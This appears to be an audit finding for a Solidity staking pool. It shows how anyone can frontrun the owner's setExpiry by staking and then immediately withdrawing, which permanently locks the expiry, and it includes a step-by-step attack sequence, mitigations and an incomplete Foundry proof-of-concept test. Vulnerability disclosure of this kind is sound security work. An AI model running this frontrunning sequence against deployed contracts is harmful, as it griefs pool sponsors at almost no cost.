### Title
Attacker can frontrun `setExpiry` to permanently lock pool expiry at zero net cost — (File: src/ConfidencePool.sol)

### Summary
Anyone can call `stake(minStake)` to permanently set `expiryLocked = true`, then immediately call `withdraw()` to recover their full principal. This lets an attacker frontrun the sponsor's `setExpiry` transaction and permanently prevent expiry updates at the cost of gas fees only — a stronger variant of the DYAD dust-deposit grief because the attacker suffers no lasting capital cost.

### Finding Description
`setExpiry` gates on `expiryLocked`:

```solidity
function setExpiry(uint256 newExpiry) external onlyOwner {
    if (expiryLocked) revert ExpiryLocked();
    ...
}
``` [1](#0-0) 

`expiryLocked` is set to `true` on the very first `stake()` call:

```solidity
if (!expiryLocked) {
    expiryLocked = true;
}
``` [2](#0-1) 

`withdraw()` clears `eligibleStake`, `totalEligibleStake`, and the per-user accumulators, but **never touches `expiryLocked`**: [3](#0-2) 

`withdraw()` is available in any pre-attack registry state (`NOT_DEPLOYED`, `NEW_DEPLOYMENT`, `ATTACK_REQUESTED`) as long as `riskWindowStart == 0`: [4](#0-3) 

Attack sequence (executable in two sequential transactions, or even the same block):

1. Attacker observes the sponsor's pending `setExpiry` in the mempool.
2. Attacker frontruns with `stake(minStake)` → `expiryLocked` flips to `true`.
3. Sponsor's `setExpiry` reverts with `ExpiryLocked`.
4. Attacker calls `withdraw()` → recovers full `minStake` principal.
5. Net attacker cost: gas only.

`expiryLocked` is now permanently `true` with zero stakers in the pool.

### Impact Explanation
The sponsor loses the ability to correct the pool's expiry. If the expiry was set too short (e.g., a typo, or the agreement term was extended), the sponsor cannot extend it. Their only recourse is to deploy an entirely new pool via the factory, abandoning the original clone address and any off-chain references to it. This is a permanent, irreversible griefing of the sponsor's pool configuration at negligible attacker cost.

### Likelihood Explanation
The attack requires only that the attacker hold `minStake` tokens of the allowlisted stake token temporarily (recovered immediately via `withdraw()`). Any holder of the stake token — including a competing sponsor, a disgruntled party, or a generic MEV bot — can execute this. The window is open from pool deployment until the first legitimate stake, which is the exact window during which the sponsor would want to call `setExpiry`. Likelihood is **medium-high**: the precondition (holding `minStake` tokens) is the only barrier, and the cost is gas.

### Recommendation
The root cause is that `expiryLocked` is a one-way latch that fires on any stake, including one that is immediately withdrawn. Two mitigations are compatible with the documented design intent (DESIGN.md §10 says the latch must not reset to prevent the sponsor from moving expiry after a legitimate all-stakers-exited moment):

1. **Tie the latch to `totalEligibleStake > 0` at call time in `setExpiry`** rather than to the historical `expiryLocked` flag. Replace the boolean with a check: `if (totalEligibleStake > 0) revert ExpiryLocked()`. This preserves the invariant that the sponsor cannot move expiry while any staker is relying on it, while eliminating the permanent-latch griefing vector. The DESIGN.md concern ("harm the next cohort") is addressed because the latch re-engages the moment any new staker deposits.

2. **Alternatively**, keep `expiryLocked` but only set it when `totalEligibleStake` crosses zero-to-nonzero and remains nonzero at the end of the `stake()` call — i.e., do not set it if the pool is paused or if the staker's deposit is the only one and they immediately withdraw. This is more complex but preserves the existing flag semantics.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

import "forge-std/Test.sol";
import {ConfidencePool} from "src/ConfidencePool.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract FrontrunSetExpiryTest is Test {
    ConfidencePool pool;
    IERC20 token;
    address sponsor = address(0xA);
    address attacker = address(0xB);

    function testFrontrunSetExpiry() public {
        // Assume pool is deployed with expiry = block.timestamp + 30 days
        // and minStake = 1e18, attacker holds minStake tokens.

        uint256 newExpiry = block.timestamp + 60 days;

        // Attacker frontruns sponsor's setExpiry:
        vm.startPrank(attacker);
        token.approve(address(pool), type(uint256).max);
        pool.stake(pool.minStake());          // expiryLocked = true
        pool.withdraw();                      // recover tokens; expiryLocked stays true
        vm.stopPrank();

        // Sponsor's setExpiry now reverts
        vm.prank(sponsor);
        vm.expectRevert(ConfidencePool.ExpiryLocked.selector);
        pool.setExpiry(newExpiry);

        // Attacker's token balance is fully restored (minus gas)
        assertEq(token.balanceOf(attacker), pool.minStake());
        // expiryLocked is permanently true with zero stakers
        assertTrue(pool.expiryLocked());
        assertEq(pool.totalEligibleStake(), 0);
    }
}
```

### Citations

**File:** src/ConfidencePool.sol (L229-231)
```text
        if (!expiryLocked) {
            expiryLocked = true;
        }
```

**File:** src/ConfidencePool.sol (L293-300)
```text
        if (
            riskWindowStart != 0
                || (state != IAttackRegistry.ContractState.NOT_DEPLOYED
                    && state != IAttackRegistry.ContractState.NEW_DEPLOYMENT
                    && state != IAttackRegistry.ContractState.ATTACK_REQUESTED)
        ) {
            revert WithdrawsDisabled();
        }
```

**File:** src/ConfidencePool.sol (L312-317)
```text
        eligibleStake[msg.sender] = 0;
        userSumStakeTime[msg.sender] = 0;
        userSumStakeTimeSq[msg.sender] = 0;
        totalEligibleStake -= amount;

        stakeToken.safeTransfer(msg.sender, amount);
```

**File:** src/ConfidencePool.sol (L622-623)
```text
    function setExpiry(uint256 newExpiry) external onlyOwner {
        if (expiryLocked) revert ExpiryLocked();
```
